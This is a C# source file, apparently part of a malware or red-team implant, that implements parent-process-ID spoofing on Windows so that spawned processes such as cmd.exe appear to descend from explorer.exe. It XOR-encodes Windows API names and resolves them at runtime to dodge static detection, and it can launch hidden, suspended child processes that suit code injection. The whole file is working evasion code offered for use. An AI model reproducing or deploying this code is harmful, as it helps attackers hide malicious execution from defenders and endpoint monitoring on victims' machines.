#if INJECT
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    /// <summary>
    /// PPID Spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
    /// Creates child processes with a fake parent PID so the process tree
    /// looks legitimate (e.g., cmd.exe spawned by explorer.exe instead of
    /// a suspicious parent).
    /// </summary>
    internal static class PpidSpoof
    {
        // ── String encoding ────────────────────────────────────────

        private static readonly byte[] _xk = { 0xB3, 0x7A, 0xF1, 0x0E, 0x65 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Encoded: "kernel32.dll"
        private static readonly byte[] _sK32 =
            { 0xD8, 0x1F, 0x83, 0x60, 0x00, 0xDF, 0x49, 0xC3, 0x20, 0x01, 0xDF, 0x16 };

        // Encoded: "InitializeProcThreadAttributeList"
        private static readonly byte[] _sInitAttr =
            { 0xFA, 0x14, 0x98, 0x7A, 0x0C, 0xD2, 0x16, 0x98, 0x74, 0x00,
              0xE3, 0x08, 0x9E, 0x6D, 0x31, 0xDB, 0x08, 0x94, 0x6F, 0x01,
              0xF2, 0x0E, 0x85, 0x7C, 0x0C, 0xD1, 0x0F, 0x85, 0x6B, 0x29,
              0xDA, 0x09, 0x85 };

        // Encoded: "UpdateProcThreadAttribute"
        private static readonly byte[] _sUpdateAttr =
            { 0xE6, 0x0A, 0x95, 0x6F, 0x11, 0xD6, 0x2A, 0x83, 0x61, 0x06,
              0xE7, 0x12, 0x83, 0x6B, 0x04, 0xD7, 0x3B, 0x85, 0x7A, 0x17,
              0xDA, 0x18, 0x84, 0x7A, 0x00 };

        // Encoded: "DeleteProcThreadAttributeList"
        private static readonly byte[] _sDeleteAttr =
            { 0xF7, 0x1F, 0x9D, 0x6B, 0x11, 0xD6, 0x2A, 0x83, 0x61, 0x06,
              0xE7, 0x12, 0x83, 0x6B, 0x04, 0xD7, 0x3B, 0x85, 0x7A, 0x17,
              0xDA, 0x18, 0x84, 0x7A, 0x00, 0xFF, 0x13, 0x82, 0x7A };

        // Encoded: "CreateProcessW"
        private static readonly byte[] _sCreateProc =
            { 0xF0, 0x08, 0x94, 0x6F, 0x11, 0xD6, 0x2A, 0x83, 0x61, 0x06,
              0xD6, 0x09, 0x82, 0x59 };

        // Encoded: "OpenProcess"
        private static readonly byte[] _sOpenProc =
            { 0xFC, 0x0A, 0x94, 0x60, 0x35, 0xC1, 0x15, 0x92, 0x6B, 0x16,
              0xC0 };

        // ── Delegate types ─────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DInitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount,
            int dwFlags, ref IntPtr lpSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DUpdateProcThreadAttribute(
            IntPtr lpAttributeList, int dwFlags,
            IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void DDeleteProcThreadAttributeList(
            IntPtr lpAttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true,
            CharSet = CharSet.Unicode)]
        private delegate bool DCreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            IntPtr lpStartupInfo,
            IntPtr lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr DOpenProcess(
            uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        // ── Constants ──────────────────────────────────────────────

        private const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint CREATE_SUSPENDED = 0x00000004;

        // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
        private static readonly IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS =
            (IntPtr)0x00020000;

        // STARTUPINFOEXW sizes
        private const int STARTUPINFO_SIZE = 104;       // STARTUPINFOW on x64
        private const int STARTUPINFOEX_SIZE = 112;     // +8 for lpAttributeList
        private const int PROCESS_INFORMATION_SIZE = 24; // x64

        // ── Cached delegates ───────────────────────────────────────

        private static DInitializeProcThreadAttributeList _initAttr;
        private static DUpdateProcThreadAttribute _updateAttr;
        private static DDeleteProcThreadAttributeList _deleteAttr;
        private static DCreateProcessW _createProcess;
        private static DOpenProcess _openProcess;
        private static bool _resolved;

        private static bool Resolve()
        {
            if (_resolved) return true;

            try
            {
                IntPtr hK32 = W.M0(D(_sK32));
                if (hK32 == IntPtr.Zero) return false;

                IntPtr pInit = W.M1(hK32, D(_sInitAttr));
                IntPtr pUpdate = W.M1(hK32, D(_sUpdateAttr));
                IntPtr pDelete = W.M1(hK32, D(_sDeleteAttr));
                IntPtr pCreate = W.M1(hK32, D(_sCreateProc));
                IntPtr pOpen = W.M1(hK32, D(_sOpenProc));

                if (pInit == IntPtr.Zero || pUpdate == IntPtr.Zero ||
                    pDelete == IntPtr.Zero || pCreate == IntPtr.Zero ||
                    pOpen == IntPtr.Zero)
                    return false;

                _initAttr = (DInitializeProcThreadAttributeList)
                    Marshal.GetDelegateForFunctionPointer(pInit, typeof(DInitializeProcThreadAttributeList));
                _updateAttr = (DUpdateProcThreadAttribute)
                    Marshal.GetDelegateForFunctionPointer(pUpdate, typeof(DUpdateProcThreadAttribute));
                _deleteAttr = (DDeleteProcThreadAttributeList)
                    Marshal.GetDelegateForFunctionPointer(pDelete, typeof(DDeleteProcThreadAttributeList));
                _createProcess = (DCreateProcessW)
                    Marshal.GetDelegateForFunctionPointer(pCreate, typeof(DCreateProcessW));
                _openProcess = (DOpenProcess)
                    Marshal.GetDelegateForFunctionPointer(pOpen, typeof(DOpenProcess));

                _resolved = true;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Create a process with a spoofed parent PID.
        /// </summary>
        /// <param name="commandLine">Command line to execute (e.g., "cmd.exe /c whoami").</param>
        /// <param name="parentPid">PID of the process to impersonate as parent.</param>
        /// <param name="suspended">Create the process in suspended state.</param>
        /// <param name="hProcess">Returns the process handle.</param>
        /// <param name="hThread">Returns the main thread handle.</param>
        /// <param name="pid">Returns the new process ID.</param>
        /// <returns>true if the process was created successfully.</returns>
        public static bool CreateWithParent(
            string commandLine, int parentPid,
            bool suspended,
            out IntPtr hProcess, out IntPtr hThread, out int pid)
        {
            hProcess = IntPtr.Zero;
            hThread = IntPtr.Zero;
            pid = 0;

            if (!Resolve())
                return false;

            IntPtr hParent = IntPtr.Zero;
            IntPtr pAttrList = IntPtr.Zero;
            IntPtr pParentVal = IntPtr.Zero;
            IntPtr pSi = IntPtr.Zero;
            IntPtr pPi = IntPtr.Zero;

            try
            {
                // Open the parent process
                hParent = _openProcess(PROCESS_ALL_ACCESS, false, (uint)parentPid);
                if (hParent == IntPtr.Zero)
                    return false;

                // Get attribute list size
                IntPtr attrSize = IntPtr.Zero;
                _initAttr(IntPtr.Zero, 1, 0, ref attrSize);

                if (attrSize == IntPtr.Zero)
                    return false;

                // Allocate attribute list
                pAttrList = Marshal.AllocHGlobal(attrSize);
                if (!_initAttr(pAttrList, 1, 0, ref attrSize))
                    return false;

                // Store parent handle in unmanaged memory
                pParentVal = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(pParentVal, hParent);

                // Update attribute list with parent process
                if (!_updateAttr(
                        pAttrList, 0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        pParentVal, (IntPtr)IntPtr.Size,
                        IntPtr.Zero, IntPtr.Zero))
                    return false;

                // Build STARTUPINFOEXW
                pSi = Marshal.AllocHGlobal(STARTUPINFOEX_SIZE);
                for (int i = 0; i < STARTUPINFOEX_SIZE; i++)
                    Marshal.WriteByte(pSi, i, 0);

                // cb = STARTUPINFOEX_SIZE
                Marshal.WriteInt32(pSi, 0, STARTUPINFOEX_SIZE);
                // lpAttributeList at offset 104 (end of STARTUPINFOW)
                Marshal.WriteIntPtr(pSi, STARTUPINFO_SIZE, pAttrList);

                // Allocate PROCESS_INFORMATION
                pPi = Marshal.AllocHGlobal(PROCESS_INFORMATION_SIZE);
                for (int i = 0; i < PROCESS_INFORMATION_SIZE; i++)
                    Marshal.WriteByte(pPi, i, 0);

                // Creation flags
                uint flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
                if (suspended)
                    flags |= CREATE_SUSPENDED;

                // Create the process
                if (!_createProcess(
                        null, commandLine,
                        IntPtr.Zero, IntPtr.Zero,
                        false, flags,
                        IntPtr.Zero, null,
                        pSi, pPi))
                    return false;

                // Extract handles and PID from PROCESS_INFORMATION
                hProcess = Marshal.ReadIntPtr(pPi, 0);   // hProcess
                hThread = Marshal.ReadIntPtr(pPi, 8);    // hThread
                pid = Marshal.ReadInt32(pPi, 16);        // dwProcessId

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                if (pAttrList != IntPtr.Zero)
                {
                    try { _deleteAttr(pAttrList); } catch { }
                    Marshal.FreeHGlobal(pAttrList);
                }

                if (pParentVal != IntPtr.Zero)
                    Marshal.FreeHGlobal(pParentVal);

                if (pSi != IntPtr.Zero)
                    Marshal.FreeHGlobal(pSi);

                if (pPi != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPi);

                if (hParent != IntPtr.Zero)
                    W.M4(hParent);
            }
        }

        /// <summary>
        /// Find a suitable parent process by name (e.g., "explorer", "svchost").
        /// Returns the PID of the first match, or 0 if not found.
        /// </summary>
        public static int FindParentPid(string processName)
        {
            try
            {
                var procs = Process.GetProcessesByName(processName);
                if (procs.Length > 0)
                    return procs[0].Id;
            }
            catch { }
            return 0;
        }

        /// <summary>
        /// Create a process spoofed under explorer.exe — the most common
        /// benign parent for user-mode processes.
        /// </summary>
        public static bool CreateUnderExplorer(
            string commandLine, bool suspended,
            out IntPtr hProcess, out IntPtr hThread, out int pid)
        {
            int parentPid = FindParentPid("explorer");
            if (parentPid == 0)
            {
                hProcess = IntPtr.Zero;
                hThread = IntPtr.Zero;
                pid = 0;
                return false;
            }

            return CreateWithParent(commandLine, parentPid, suspended,
                out hProcess, out hThread, out pid);
        }
    }
}
#endif
